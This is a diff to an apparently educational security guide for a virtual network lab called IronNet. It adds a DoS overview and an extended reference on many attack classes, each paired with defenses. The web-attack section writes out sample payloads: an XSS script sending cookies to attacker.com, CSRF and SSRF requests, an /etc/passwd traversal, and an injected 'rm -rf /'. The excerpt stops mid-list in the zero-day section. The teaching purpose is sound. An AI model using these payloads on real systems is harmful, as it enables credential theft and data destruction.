@@ -114,163 +114,182 @@ A comprehensive guide for beginners covering networking fundamentals, hacking te
 - 14.11 Covert channel detection (anomaly-based)
 - 14.12 Challenge ACK (session hijacking defense)
 
+**15. Additional Hacking Techniques (Extended Reference)**
+- 15.1 Web Application Attacks [NOT IMPLEMENTED] — SQLi, XSS, CSRF, SSRF, directory traversal, command injection
+- 15.2 Wireless Attacks [NOT IMPLEMENTED] — WEP cracking, WPA attacks, evil twin, deauth
+- 15.3 Cryptographic Attacks [NOT IMPLEMENTED] — padding oracle, birthday, length extension, downgrade, side-channel
+- 15.4 Social Engineering [NOT IMPLEMENTED] — phishing, pretexting, baiting, tailgating
+- 15.5 Privilege Escalation [NOT IMPLEMENTED] — Linux (SUID, kernel, sudo, cron) + Windows (tokens, DLL hijack)
+- 15.6 Lateral Movement [NOT IMPLEMENTED] — pass-the-hash, pass-the-ticket, golden ticket, PSExec
+- 15.7 Persistence Mechanisms [NOT IMPLEMENTED] — backdoors, rootkits, registry, cron, systemd
+- 15.8 Malware Techniques [NOT IMPLEMENTED] — virus/worm/trojan/ransomware, evasion, C2
+- 15.9 Advanced Persistent Threats (APT) [NOT IMPLEMENTED] — kill chain, MITRE ATT&CK
+- 15.10 Container and Cloud Attacks [NOT IMPLEMENTED] — container escape, Kubernetes, cloud SSRF
+- 15.11 Hardware and Physical Attacks [NOT IMPLEMENTED] — USB attacks, JTAG, cold boot, TEMPEST
+- 15.12 Supply Chain Attacks [NOT IMPLEMENTED] — compromised packages, build pipeline, typosquatting
+- 15.13 Zero-Day Exploitation [NOT IMPLEMENTED] — market, exploit chains
+- 15.14 Reverse Engineering [NOT IMPLEMENTED] — static/dynamic analysis, anti-RE
+- 15.15 IoT and Embedded Device Attacks [NOT IMPLEMENTED] — default creds, firmware extraction, Mirai
+- 15.16 Blockchain and Cryptocurrency Attacks [NOT IMPLEMENTED] — 51% attack, smart contracts, cryptojacking
+- 15.17 AI/ML Security [NOT IMPLEMENTED] — adversarial examples, model poisoning, prompt injection
+
 ### Part III: IronNet Architecture and Design
 
-**15. System Architecture Overview**
-- 15.1 Component diagram (ironstack, ironctl, ironmon, ironapps, ironattack, ironsim, irontrace)
-- 15.2 Data plane vs control plane separation
-- 15.3 Packet processing pipeline (L2 → L3 → L4 → App)
-- 15.4 Event-driven main loop (non-blocking I/O)
-- 15.5 Thread model (main loop + CLI thread)
+**16. System Architecture Overview**
+- 16.1 Component diagram (ironstack, ironctl, ironmon, ironapps, ironattack, ironsim, irontrace)
+- 16.2 Data plane vs control plane separation
+- 16.3 Packet processing pipeline (L2 → L3 → L4 → App)
+- 16.4 Event-driven main loop (non-blocking I/O)
+- 16.5 Thread model (main loop + CLI thread)
 
-**16. Virtual Network I/O (TUN/TAP)**
-- 16.1 What is TUN vs TAP
-- 16.2 How /dev/net/tun works on Linux
-- 16.3 IFF_TAP | IFF_NO_PI flags
-- 16.4 Non-blocking read/write
-- 16.5 Multiple TAP interfaces (iron0, iron1)
-- 16.6 Linux-side configuration (ip addr, ip link)
+**17. Virtual Network I/O (TUN/TAP)**
+- 17.1 What is TUN vs TAP
+- 17.2 How /dev/net/tun works on Linux
+- 17.3 IFF_TAP | IFF_NO_PI flags
+- 17.4 Non-blocking read/write
+- 17.5 Multiple TAP interfaces (iron0, iron1)
+- 17.6 Linux-side configuration (ip addr, ip link)
 
-**17. Build System and Project Structure**
-- 17.1 CMake configuration (Debug/Release, ASAN)
-- 17.2 Directory layout (src/, build/, demos/, configs/)
-- 17.3 Library targets (iron_common, iron_cli, iron_mon, iron_apps, etc.)
-- 17.4 Binary targets (ironstack, ironattack, ironmitm, ironsim, etc.)
-- 17.5 Test infrastructure (unit tests, module tests, CTest)
-- 17.6 WSL path spaces workaround (symlink)
+**18. Build System and Project Structure**
+- 18.1 CMake configuration (Debug/Release, ASAN)
+- 18.2 Directory layout (src/, build/, demos/, configs/)
+- 18.3 Library targets (iron_common, iron_cli, iron_mon, iron_apps, etc.)
+- 18.4 Binary targets (ironstack, ironattack, ironmitm, ironsim, etc.)
+- 18.5 Test infrastructure (unit tests, module tests, CTest)
+- 18.6 WSL path spaces workaround (symlink)
 
-**18. Configuration System**
-- 18.1 router.conf format (interface, route, acl lines)
-- 18.2 Config parser implementation
-- 18.3 Runtime CLI configuration (ironctl commands)
-- 18.4 Defense enable/disable at runtime
+**19. Configuration System**
+- 19.1 router.conf format (interface, route, acl lines)
+- 19.2 Config parser implementation
+- 19.3 Runtime CLI configuration (ironctl commands)
+- 19.4 Defense enable/disable at runtime
 
 ### Part IV: Source Code Walkthrough
 
-**19. Common Utilities (`src/common/`)**
-- 19.1 `types.h` — network types, enums, drop reasons
-- 19.2 `log.h/c` — timestamped leveled logging
-- 19.3 `stats.h/c` — global counter infrastructure
-- 19.4 `utils.h/c` — byte-order, checksum, IP string conversion
-- 19.5 `assert.h` — IRON_ASSERT invariant enforcement
+**20. Common Utilities (`src/common/`)**
+- 20.1 `types.h` — network types, enums, drop reasons
+- 20.2 `log.h/c` — timestamped leveled logging
+- 20.3 `stats.h/c` — global counter infrastructure
+- 20.4 `utils.h/c` — byte-order, checksum, IP string conversion
+- 20.5 `assert.h` — IRON_ASSERT invariant enforcement
 
-**20. Protocol Stack Core (`src/ironstack/`)**
-- 20.1 `main.c` — daemon entry point, signal handling, main loop
-- 20.2 `core/pipeline.c` — packet processing loop, timer ticks
-- 20.3 `core/iface.c` — interface configuration model
-- 20.4 `core/router_conf.c` — config file parser
-- 20.5 `io/vnic.c` — TAP device abstraction
+**21. Protocol Stack Core (`src/ironstack/`)**
+- 21.1 `main.c` — daemon entry point, signal handling, main loop
+- 21.2 `core/pipeline.c` — packet processing loop, timer ticks
+- 21.3 `core/iface.c` — interface configuration model
+- 21.4 `core/router_conf.c` — config file parser
+- 21.5 `io/vnic.c` — TAP device abstraction
 
-**21. Layer 2 Implementation (`src/ironstack/l2/`)**
-- 21.1 `eth.c` — Ethernet frame parse/build/dispatch
-- 21.2 `arp.c` — ARP table, request/reply, inspection
-- 21.3 `vlan.c` — 802.1Q tag insert/strip, access/trunk ports
-- 21.4 `bridge.c` — MAC learning, unicast forwarding, flooding
+**22. Layer 2 Implementation (`src/ironstack/l2/`)**
+- 22.1 `eth.c` — Ethernet frame parse/build/dispatch
+- 22.2 `arp.c` — ARP table, request/reply, inspection
+- 22.3 `vlan.c` — 802.1Q tag insert/strip, access/trunk ports
+- 22.4 `bridge.c` — MAC learning, unicast forwarding, flooding
 
-**22. Layer 3 Implementation (`src/ironstack/l3/`)**
-- 22.1 `ip.c` — IP input/output, validation, forwarding
-- 22.2 `route.c` — routing table, longest-prefix match
-- 22.3 `route_table.c` — multiple named routing tables (VRF-lite)
-- 22.4 `acl.c` — access control list, first-match evaluation
-- 22.5 `pbr.c` — policy-based routing, loop detection
-- 22.6 `icmp.c` — echo request/reply, redirect handling
-- 22.7 `ip_frag.c` — fragmentation and reassembly
-- 22.8 `conntrack.c` — connection tracking (NEW/ESTABLISHED/INVALID)
-- 22.9 `nat.c` — SNAT/DNAT, port allocation, return-path translation
+**23. Layer 3 Implementation (`src/ironstack/l3/`)**
+- 23.1 `ip.c` — IP input/output, validation, forwarding
+- 23.2 `route.c` — routing table, longest-prefix match
+- 23.3 `route_table.c` — multiple named routing tables (VRF-lite)
+- 23.4 `acl.c` — access control list, first-match evaluation
+- 23.5 `pbr.c` — policy-based routing, loop detection
+- 23.6 `icmp.c` — echo request/reply, redirect handling
+- 23.7 `ip_frag.c` — fragmentation and reassembly
+- 23.8 `conntrack.c` — connection tracking (NEW/ESTABLISHED/INVALID)
+- 23.9 `nat.c` — SNAT/DNAT, port allocation, return-path translation
 
-**23. Layer 4 Implementation (`src/ironstack/l4/`)**
-- 23.1 `tcp.c` — TCP state machine, connection table, SYN cookies, output
-- 23.2 `udp.c` — stateless UDP dispatch
+**24. Layer 4 Implementation (`src/ironstack/l4/`)**
+- 24.1 `tcp.c` — TCP state machine, connection table, SYN cookies, output
+- 24.2 `udp.c` — stateless UDP dispatch
 
-**24. Security Module (`src/ironstack/security/`)**
-- 24.1 `defense.c` — defense registry, SYN cookies, rate limiting
-- 24.2 `ipsec.c` — SA lifecycle, policy enforcement, XOR transform
-- 24.3 `covert_detect.c` — entropy analysis, timing bimodality, ISN/DNS detection
+**25. Security Module (`src/ironstack/security/`)**
+- 25.1 `defense.c` — defense registry, SYN cookies, rate limiting
+- 25.2 `ipsec.c` — SA lifecycle, policy enforcement, XOR transform
+- 25.3 `covert_detect.c` — entropy analysis, timing bimodality, ISN/DNS detection
 
-**25. Application Servers (`src/ironapps/`)**
-- 25.1 `app_socket.c` — socket API, listener registry, TCP/UDP output
-- 25.2 `echo_server.c` — TCP/UDP echo (port 7)
-- 25.3 `dns_server.c` — DNS server with zone table, cache, response builder
-- 25.4 `kv_server.c` — key-value store (port 6379)
-- 25.5 `http_server.c` — HTTP-like server (port 8080)
-- 25.6 `rpc_server.c` — binary RPC protocol (port 9000)
-- 25.7 `vuln_server.c` — intentionally vulnerable server (port 9999)
+**26. Application Servers (`src/ironapps/`)**
+- 26.1 `app_socket.c` — socket API, listener registry, TCP/UDP output
+- 26.2 `echo_server.c` — TCP/UDP echo (port 7)
+- 26.3 `dns_server.c` — DNS server with zone table, cache, response builder
+- 26.4 `kv_server.c` — key-value store (port 6379)
+- 26.5 `http_server.c` — HTTP-like server (port 8080)
+- 26.6 `rpc_server.c` — binary RPC protocol (port 9000)
+- 26.7 `vuln_server.c` — intentionally vulnerable server (port 9999)
 
-**26. Attack Tools (`src/ironattack/`)**
-- 26.1 `main.c` — subcommand dispatch (12 commands)
-- 26.2 `craft.c` — raw packet construction (TCP, ARP, ICMP, IP fragments)
-- 26.3 `dns_spoof_ext.c` — external DNS cache poisoning (Kaminsky-style)
-- 26.4 `exploit.c` — buffer overflow exploitation (crash, pattern, payload, fmtstr)
-- 26.5 `covert.c` — 6 covert channel implementations
-- 26.6 `mitm.c` — MITM relay engine (ARP poison + sniff + modify + forward)
+**27. Attack Tools (`src/ironattack/`)**
+- 27.1 `main.c` — subcommand dispatch (12 commands)
+- 27.2 `craft.c` — raw packet construction (TCP, ARP, ICMP, IP fragments)
+- 27.3 `dns_spoof_ext.c` — external DNS cache poisoning (Kaminsky-style)
+- 27.4 `exploit.c` — buffer overflow exploitation (crash, pattern, payload, fmtstr)
+- 27.5 `covert.c` — 6 covert channel implementations
+- 27.6 `mitm.c` — MITM relay engine (ARP poison + sniff + modify + forward)
 
-**27. Supporting Tools**
-- 27.1 `ironctl/cli.c` — embedded CLI (commands, thread, dispatch)
-- 27.2 `ironmon/audit.c` — audit ring buffer, file output, JSON export
-- 27.3 `ironmon/stats_json.c` — JSON stats export
-- 27.4 `ironprobe/probe.c` — internal port scanner
-- 27.5 `ironfuzz/fuzz.c` — mutation engine, corpus, seed generators
-- 27.6 `ironload/load.c` — stress tester (TCP flood, route/ACL stress)
-- 27.7 `irontrace/trace.c` — pcap capture with pipeline hooks
-- 27.8 `irontrace/replay.c` — pcap replay via raw socket
-- 27.9 `ironsim/main.c` — network emulator (multi-node topology)
-- 27.10 `ironsim/test_traffic.c` — traffic generator and report
-- 27.11 `ironprobe_ext/main.c` — external SYN scanner
-- 27.12 `ironprobe_ext/report.c` — automated attack-defense report
+**28. Supporting Tools**
+- 28.1 `ironctl/cli.c` — embedded CLI (commands, thread, dispatch)
+- 28.2 `ironmon/audit.c` — audit ring buffer, file output, JSON export
+- 28.3 `ironmon/stats_json.c` — JSON stats export
+- 28.4 `ironprobe/probe.c` — internal port scanner
+- 28.5 `ironfuzz/fuzz.c` — mutation engine, corpus, seed generators
+- 28.6 `ironload/load.c` — stress tester (TCP flood, route/ACL stress)
+- 28.7 `irontrace/trace.c` — pcap capture with pipeline hooks
+- 28.8 `irontrace/replay.c` — pcap replay via raw socket
+- 28.9 `ironsim/main.c` — network emulator (multi-node topology)
+- 28.10 `ironsim/test_traffic.c` — traffic generator and report
+- 28.11 `ironprobe_ext/main.c` — external SYN scanner
+- 28.12 `ironprobe_ext/report.c` — automated attack-defense report
 
-**28. Test Infrastructure (`src/tests/`)**
-- 28.1 Test philosophy (unit vs module vs interactive)
-- 28.2 Stub pattern (defense_stub, audit_stub, trace_stub, covert_stub, etc.)
-- 28.3 Module test framework (`module_test.h`)
-- 28.4 Unit test listing (21 tests, what each validates)
-- 28.5 Module test listing (11 tests, what each demonstrates)
+**29. Test Infrastructure (`src/tests/`)**
+- 29.1 Test philosophy (unit vs module vs interactive)
+- 29.2 Stub pattern (defense_stub, audit_stub, trace_stub, covert_stub, etc.)
+- 29.3 Module test framework (`module_test.h`)
+- 29.4 Unit test listing (21 tests, what each validates)
+- 29.5 Module test listing (11 tests, what each demonstrates)
 
 ### Part V: Deployment and Usage
 
-**29. Building IronNet**
-- 29.1 Prerequisites (WSL2, Ubuntu, GCC, CMake)
-- 29.2 Debug build (with ASAN)
-- 29.3 Release build (optimized)
-- 29.4 Running tests (ctest)
-- 29.5 Troubleshooting common build issues
+**30. Building IronNet**
+- 30.1 Prerequisites (WSL2, Ubuntu, GCC, CMake)
+- 30.2 Debug build (with ASAN)
+- 30.3 Release build (optimized)
+- 30.4 Running tests (ctest)
+- 30.5 Troubleshooting common build issues
 
-**30. Running the Virtual Router**
-- 30.1 Starting ironstack with config file
-- 30.2 Linux-side TAP setup (ip addr, ip link)
-- 30.3 CLI usage (ironctl prompt)
-- 30.4 Verifying connectivity (ping, dig, nc)
+**31. Running the Virtual Router**
+- 31.1 Starting ironstack with config file
+- 31.2 Linux-side TAP setup (ip addr, ip link)
+- 31.3 CLI usage (ironctl prompt)
+- 31.4 Verifying connectivity (ping, dig, nc)
 
-**31. Running Attack Tools**
-- 31.1 ironattack subcommands overview
-- 31.2 Attack workflow (reconnaissance → exploitation → post-exploitation)
-- 31.3 Defense enable/disable workflow
-- 31.4 Attack-defense report (ironreport)
+**32. Running Attack Tools**
+- 32.1 ironattack subcommands overview
+- 32.2 Attack workflow (reconnaissance → exploitation → post-exploitation)
+- 32.3 Defense enable/disable workflow
+- 32.4 Attack-defense report (ironreport)
 
-**32. Network Emulation (ironsim)**
-- 32.1 Topology configuration format
-- 32.2 2-node and 3-node topologies
-- 32.3 Link impairments (delay, loss, reorder)
-- 32.4 Traffic testing (ironsim-test)
+**33. Network Emulation (ironsim)**
+- 33.1 Topology configuration format
+- 33.2 2-node and 3-node topologies
+- 33.3 Link impairments (delay, loss, reorder)
+- 33.4 Traffic testing (ironsim-test)
 
-**33. Packet Capture and Replay (irontrace)**
-- 33.1 Starting/stopping capture
-- 33.2 pcap format and Wireshark compatibility
-- 33.3 Replay modes (timed vs fast, internal vs external)
-- 33.4 Regression testing workflow
+**34. Packet Capture and Replay (irontrace)**
+- 34.1 Starting/stopping capture
+- 34.2 pcap format and Wireshark compatibility
+- 34.3 Replay modes (timed vs fast, internal vs external)
+- 34.4 Regression testing workflow
 
-**34. Demo Guide**
-- 34.1 Demo file organization (36 self-contained demos)
-- 34.2 Quick reference: which demo for which topic
-- 34.3 Recommended learning path for beginners
+**35. Demo Guide**
+- 35.1 Demo file organization (36 self-contained demos)
+- 35.2 Quick reference: which demo for which topic
+- 35.3 Recommended learning path for beginners
 
 ### Part VI: Appendices
 
-**35. Glossary of Terms**
+**36. Glossary of Terms**
 - Network terminology (MTU, TTL, CIDR, NAT, etc.)
 - Security terminology (CVE, CWE, ASLR, ROP, etc.)
 - IronNet-specific terminology (ironstack, ironctl, etc.)
 
-**36. Protocol Reference Tables**
+**37. Protocol Reference Tables**
 - Ethernet frame format (byte offsets)
 - IPv4 header format (byte offsets)
 - TCP header format (byte offsets)
@@ -279,13 +298,13 @@ A comprehensive guide for beginners covering networking fundamentals, hacking te
 - DNS message format (byte offsets)
 - ARP packet format (byte offsets)
 
-**37. Attack-Defense Matrix**
+**38. Attack-Defense Matrix**
 - Complete table: all attacks, their defenses, and effectiveness metrics
 
-**38. Port and Service Map**
+**39. Port and Service Map**
 - All IronNet services with ports, protocols, and purpose
 
-**39. References and Further Reading**
+**40. References and Further Reading**
 - RFCs (791, 793, 826, 1035, etc.)
 - Security resources (OWASP, MITRE ATT&CK, CWE)
 - Books (TCP/IP Illustrated, Hacking: Art of Exploitation, etc.)
@@ -1147,6 +1166,20 @@ Switch 2: sees VLAN 20 tag → forwards to VLAN 20 ports
 
 ## 9. Layer 3/4 Attacks
 
+**DoS (Denial of Service)** is the overarching goal of many L3/L4 attacks — make a service unavailable by exhausting its resources:
+
+| DoS Category | What it exhausts | Example attacks |
+|-------------|-----------------|----------------|
+| Volumetric | Network bandwidth | UDP flood, DNS amplification, NTP amplification |
+| Protocol | Connection state tables | SYN flood, RST flood, ACK flood |
+| Application | App-level resources | Slowloris, HTTP POST flood, regex DoS |
+
+**DDoS (Distributed DoS):** Same attacks from thousands of compromised machines (botnet). Defense requires upstream filtering, anycast, or scrubbing centers.
+
+**Amplification:** Attacker sends small request (spoofed source = victim) to a reflector. Reflector sends large response to victim. DNS amplification: 60-byte query → 3000-byte response (50x). NTP: 556x. Memcached: 51000x.
+
+IronNet demonstrates DoS through SYN flood (protocol), Slowloris (application), and MAC flooding (L2). Defenses: SYN cookies, rate limiting, connection timeout.
+
 ### 9.1 SYN Flood (Resource Exhaustion DoS)
 
 **The attack:** Send thousands of TCP SYN packets from spoofed source IPs. The server allocates a connection table entry for each SYN (SYN_RECV state) and waits for the ACK that never comes.
@@ -1793,10 +1826,482 @@ Bridge table stays intact, unicast forwarding continues normally
 
 ---
 
+## 15. Additional Hacking Techniques (Extended Reference)
 
-## 15. System Architecture Overview
+This section covers additional hacking techniques and cybersecurity topics that are important for a complete security education. Topics marked with **[NOT IMPLEMENTED]** are not demonstrated in IronNet but are explained here for reference.
 
-### 15.1 Component Diagram
+### 15.1 Web Application Attacks [NOT IMPLEMENTED]
+
+IronNet focuses on network-layer attacks. Web application attacks target Layer 7 (HTTP) vulnerabilities:
+
+**SQL Injection (SQLi)**
+
+Attacker inserts SQL code into input fields that are used in database queries:
+```
+Normal:   SELECT * FROM users WHERE name = 'alice'
+Attack:   SELECT * FROM users WHERE name = '' OR '1'='1' --'
+                                                ↑ always true = returns ALL users
+```
+
+Types:
+- **In-band:** Results visible in response (UNION-based, error-based)
+- **Blind:** No visible output; infer data via true/false responses or timing
+- **Out-of-band:** Exfiltrate data via DNS or HTTP to attacker's server
+
+Defense: Parameterized queries (prepared statements), input validation, WAF.
+
+**Cross-Site Scripting (XSS)**
+
+Attacker injects JavaScript into a web page viewed by other users:
+```html
+<!-- Stored XSS: attacker posts this as a comment -->
+<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
+```
+
+Types:
+- **Reflected:** Malicious script in URL parameter, reflected in response
+- **Stored:** Script saved in database, executed when other users view the page
+- **DOM-based:** Script manipulates client-side DOM without server involvement
+
+Defense: Output encoding, Content Security Policy (CSP), HttpOnly cookies.
+
+**Cross-Site Request Forgery (CSRF)**
+
+Attacker tricks authenticated user into making unintended requests:
+```html
+<!-- On attacker's page, auto-submits form to victim's bank -->
+<img src="http://bank.com/transfer?to=attacker&amount=10000">
+```
+
+The browser automatically includes the user's session cookie. The bank can't distinguish this from a legitimate request.
+
+Defense: CSRF tokens, SameSite cookies, checking Referer header.
+
+**Server-Side Request Forgery (SSRF)**
+
+Attacker makes the server send requests to internal resources:
+```
+User input: url=http://169.254.169.254/latest/meta-data/
+→ Server fetches AWS metadata (contains credentials!)
+```
+
+Defense: Whitelist allowed URLs, block internal IP ranges, disable unnecessary URL fetching.
+
+**Directory Traversal / Path Traversal**
+```
+GET /download?file=../../../etc/passwd
+→ Server reads /etc/passwd instead of intended file
+```
+
+Defense: Canonicalize paths, chroot, whitelist allowed directories.
+
+**Command Injection**
+```
+User input: filename=test; rm -rf /
+Server runs: cat test; rm -rf /
+```
+
+Defense: Never pass user input to shell commands. Use parameterized APIs.
+
+---
+
+### 15.2 Wireless Attacks [NOT IMPLEMENTED]
+
+IronNet uses wired TAP interfaces. Wireless attacks target WiFi (802.11):
+
+**WEP Cracking**
+
+WEP (Wired Equivalent Privacy) uses RC4 with a 24-bit IV (Initialization Vector). The IV space is small (16 million) — after collecting enough packets, statistical attacks recover the key in minutes.
+
+Tools: aircrack-ng, airmon-ng
+
+**WPA/WPA2 Attacks**
+
+- **4-way handshake capture + dictionary attack:** Capture the EAPOL handshake, then offline brute-force the PSK (Pre-Shared Key)
+- **PMKID attack:** Extract PMKID from the first handshake message (no need to wait for full handshake)
+- **KRACK (Key Reinstallation Attack):** Force nonce reuse in WPA2 handshake → decrypt traffic
+
+Tools: aircrack-ng, hashcat, hcxdumptool
+
+**Evil Twin / Rogue AP**
+
+Set up a fake access point with the same SSID as a legitimate network. Victims connect to the attacker's AP → all traffic intercepted (WiFi-level MITM).
+
+**Deauthentication Attack**
+
+Send forged 802.11 deauth frames to disconnect clients from their AP. Used to:
+- Force reconnection to evil twin
+- Capture WPA handshake (client reconnects)
+- DoS (keep disconnecting)
+
+Tools: aireplay-ng, mdk3
+
+---
+
+### 15.3 Cryptographic Attacks [NOT IMPLEMENTED]
+
+IronNet uses XOR as a dummy cipher. Real cryptographic attacks:
+
+**Padding Oracle Attack**
+
+Exploit error messages that reveal whether decrypted padding is valid. By manipulating ciphertext bytes and observing responses, attacker can decrypt the entire message without knowing the key.
+
+Affects: CBC mode ciphers (AES-CBC, DES-CBC)
+
+**Birthday Attack (Hash Collisions)**
+
+Find two different inputs that produce the same hash. With n-bit hash, expected collisions after ~2^(n/2) attempts. MD5 (128-bit) can be collided in seconds.
+
+**Length Extension Attack**
+
+For hash(secret || message), attacker can compute hash(secret || message || padding || attacker_data) without knowing the secret. Affects: MD5, SHA-1, SHA-256 (not HMAC).
+
+**Downgrade Attack**
+
+Force a connection to use a weaker cipher suite:
+- POODLE: downgrade TLS to SSL 3.0 (broken)
+- FREAK: force export-grade RSA (512-bit, easily factored)
+- Logjam: force 512-bit Diffie-Hellman
+
+**Side-Channel Attacks**
+
+- **Timing attack:** Measure how long operations take (e.g., string comparison that returns early on mismatch)
+- **Power analysis:** Measure CPU power consumption during crypto operations
+- **Cache timing:** Observe CPU cache behavior to infer secret key bits (Spectre, Meltdown)
+
+---
+
+### 15.4 Social Engineering [NOT IMPLEMENTED]
+
+Non-technical attacks targeting humans:
+
+**Phishing**
+
+Fake emails/websites that impersonate legitimate services to steal credentials:
+- **Spear phishing:** Targeted at specific individuals (uses personal info)
+- **Whaling:** Targeted at executives
+- **Vishing:** Voice phishing (phone calls)
+- **Smishing:** SMS phishing
+
+**Pretexting**
+
+Create a fabricated scenario to manipulate the target: "Hi, I'm from IT support. I need your password to fix your account."
+
+**Baiting**
+
+Leave infected USB drives in parking lots. Curious employees plug them in → malware executes.
+
+**Tailgating / Piggybacking**
+
+Follow an authorized person through a secured door without badging in.
+
+---
+
+### 15.5 Privilege Escalation [NOT IMPLEMENTED]
+
+After gaining initial access, escalate to higher privileges:
+
+**Linux Privilege Escalation:**
+- SUID binaries: find files with setuid bit that can be exploited
+- Kernel exploits: exploit kernel vulnerabilities (e.g., DirtyPipe, DirtyCow)
+- Misconfigured sudo: `sudo -l` reveals commands user can run as root
+- Writable /etc/passwd: add a new root user
+- Cron jobs: modify scripts that run as root
+- PATH hijacking: place malicious binary in a directory that's searched first
+
+**Windows Privilege Escalation:**
+- Unquoted service paths: inject DLL in path with spaces
+- Token impersonation: steal SYSTEM token (Potato attacks)
+- AlwaysInstallElevated: MSI packages install as SYSTEM
+- DLL hijacking: place malicious DLL where application searches
+
+---
+
+### 15.6 Lateral Movement [NOT IMPLEMENTED]
+
+After compromising one machine, move to others on the network:
+
+**Pass-the-Hash (PtH)**
+
+Use stolen NTLM hash to authenticate without knowing the plaintext password. Works because Windows authentication accepts the hash directly.
+
+**Pass-the-Ticket (PtT)**
+
+Steal Kerberos tickets (TGT or service tickets) and reuse them to access resources.
+
+**Golden Ticket**
+
+Forge a Kerberos TGT using the domain's KRBTGT hash. Grants unlimited access to any resource in the domain for the ticket's lifetime (default 10 years).
+
+**PSExec / WMI / WinRM**
+
+Use legitimate Windows administration tools to execute commands on remote machines (requires valid credentials or hashes).
+
+**SSH Key Theft**
+
+Steal private SSH keys from compromised machines to access other servers without passwords.
+
+---
+
+### 15.7 Persistence Mechanisms [NOT IMPLEMENTED]
+
+Maintain access after initial compromise:
+
+**Backdoors:**
+- Reverse shell: victim connects back to attacker (bypasses firewalls)
+- Web shell: PHP/ASP file on web server providing command execution
+- SSH authorized_keys: add attacker's public key
+
+**Rootkits:**
+- **User-mode:** Hook system calls in userspace (LD_PRELOAD)
+- **Kernel-mode:** Modify kernel data structures (hide processes, files, connections)
+- **Bootkits:** Infect boot sector (survives OS reinstall)
+
+**Registry / Startup persistence (Windows):**
+- Run keys: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
+- Scheduled tasks: `schtasks /create`
+- WMI event subscriptions: trigger on system events
+- Services: create a new service that starts automatically
+
+**Linux persistence:**
+- Cron jobs: `@reboot /path/to/backdoor`
+- systemd services: create a service unit file
+- .bashrc / .profile: execute on user login
+- PAM modules: intercept authentication
+
+---
+
+### 15.8 Malware Techniques [NOT IMPLEMENTED]
+
+**Types of malware:**
+| Type | Behavior |
+|------|----------|
+| Virus | Attaches to legitimate files, spreads when file is executed |
+| Worm | Self-replicating, spreads over network without user interaction |
+| Trojan | Disguised as legitimate software |
+| Ransomware | Encrypts files, demands payment for decryption key |
+| Spyware | Silently collects information (keylogger, screen capture) |
+| Botnet | Network of compromised machines controlled by attacker (C2) |
+| RAT | Remote Access Trojan — full remote control of victim |
+
+**Evasion techniques:**
+- **Polymorphism:** Malware changes its code on each infection (different hash)
+- **Metamorphism:** Completely rewrites itself (different structure)
+- **Packing:** Compress/encrypt the binary, unpack at runtime (evades static analysis)
+- **Living off the land (LOLBins):** Use legitimate system tools (PowerShell, certutil, mshta) instead of custom malware
+- **Fileless malware:** Runs entirely in memory, never touches disk
+- **Anti-sandbox:** Detect VM/sandbox environment and behave normally (don't trigger)
+
+**Command & Control (C2):**
+- HTTP/HTTPS beaconing (blends with normal web traffic)
+- DNS tunneling (IronNet demonstrates this with covert DNS channel)
+- Social media dead drops (commands hidden in tweets/posts)
+- Domain fronting (hide C2 behind legitimate CDN domains)
+
+---
+
+### 15.9 Advanced Persistent Threats (APT) [NOT IMPLEMENTED]
+
+APTs are sophisticated, long-term attack campaigns (typically nation-state):
+
+**Kill Chain (Lockheed Martin):**
+```
+1. Reconnaissance    → Research target (OSINT, scanning)
+2. Weaponization     → Create exploit + payload
+3. Delivery          → Send to target (phishing, watering hole)
+4. Exploitation      → Trigger vulnerability
+5. Installation      → Install backdoor/RAT
+6. Command & Control → Establish C2 channel
+7. Actions on Objectives → Steal data, disrupt operations
+```
+
+**MITRE ATT&CK Framework:**
+
+Categorizes adversary behavior into tactics (what they want to achieve) and techniques (how they do it):
+- Initial Access: phishing, exploit public-facing app, supply chain
+- Execution: PowerShell, command line, scripting
+- Persistence: registry keys, scheduled tasks, implants
+- Privilege Escalation: exploit, token manipulation
+- Defense Evasion: obfuscation, disabling security tools
+- Credential Access: keylogging, credential dumping
+- Discovery: network scanning, system enumeration
+- Lateral Movement: pass-the-hash, remote services
+- Collection: data staging, screen capture
+- Exfiltration: encrypted channel, DNS tunneling
+- Impact: data destruction, ransomware
+
+---
+
+### 15.10 Container and Cloud Attacks [NOT IMPLEMENTED]
+
+**Container Escape:**
+- Exploit kernel vulnerabilities from within container
+- Mount host filesystem via misconfigured volumes
+- Abuse privileged containers (--privileged flag)
+- Exploit container runtime vulnerabilities (runc CVE-2019-5736)
+
+**Kubernetes Attacks:**
+- Exposed API server (no authentication)
+- Privileged pods → node compromise
+- Service account token theft → cluster access
+- etcd access → read all secrets
+
+**Cloud Attacks:**
+- SSRF to metadata endpoint (169.254.169.254) → steal IAM credentials
+- Misconfigured S3 buckets (public read/write)
+- Overly permissive IAM policies
+- Cross-account role assumption
+
+---
+
+### 15.11 Hardware and Physical Attacks [NOT IMPLEMENTED]
+
+**USB Attacks:**
+- **Rubber Ducky:** USB device that emulates a keyboard, types commands at high speed
+- **BadUSB:** Reprogram USB firmware to act as different device type
+- **USB Killer:** Sends high voltage through USB port (physical destruction)
+
+**JTAG/Debug Ports:**
+- Access debug interfaces on embedded devices
+- Read/write firmware, extract encryption keys
+- Bypass secure boot
+
+**Cold Boot Attack:**
+- RAM retains data briefly after power off
+- Freeze RAM with compressed air → remove and read in another machine
+- Extract encryption keys from memory
+
+**Electromagnetic Emanations (TEMPEST):**
+- Monitor electromagnetic radiation from cables/screens
+- Reconstruct displayed images from EM emissions
+- Van Eck phreaking: read CRT/LCD from a distance
+
+---
+
+### 15.12 Supply Chain Attacks [NOT IMPLEMENTED]
+
+**Software supply chain:**
+- Compromise a popular library/package (e.g., event-stream npm incident)
+- Inject malicious code into build pipeline
+- Compromise update mechanism (SolarWinds attack)
+- Typosquatting: publish malicious package with similar name (e.g., `reqeusts` vs `requests`)
+
+**Hardware supply chain:**
+- Implant chips during manufacturing
+- Modify firmware before delivery
+- Counterfeit components with backdoors
+
+---
+
+### 15.13 Zero-Day Exploitation [NOT IMPLEMENTED]
+
+**What is a zero-day?**
+
+A vulnerability unknown to the vendor (no patch exists). Called "zero-day" because the vendor has had zero days to fix it.
+
+**Zero-day market:**
+- Bug bounty programs: vendors pay researchers to report (Google: up to $250K)
+- Gray market: brokers sell to governments (Zerodium: up to $2.5M for iOS)
+- Black market: sold to criminals (no disclosure)
+
+**Exploit chain:**
+
+Modern systems require chaining multiple vulnerabilities:
+```
+1. Browser vulnerability (code execution in sandbox)
+2. Sandbox escape (break out of browser sandbox)
+3. Privilege escalation (user → root/SYSTEM)
